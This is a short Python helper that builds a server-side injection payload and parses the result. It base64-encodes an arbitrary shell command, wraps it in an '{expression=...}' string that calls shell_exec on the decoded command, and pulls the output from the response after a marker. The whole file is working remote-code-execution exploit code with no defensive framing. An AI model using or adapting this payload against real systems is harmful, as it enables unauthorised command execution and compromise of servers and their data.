import base64

def build_payload(cmd):
    encoded = base64.b64encode(cmd.encode()).decode()
    return '{expression="print(\'<<<OUTPUT>>>\' + shell_exec(base64_decode(\'' + encoded + '\')))"}'

def extract_output(text):
    marker = "<<<OUTPUT>>>"
    if marker in text:
        return text.split(marker, 1)[1]
    return None
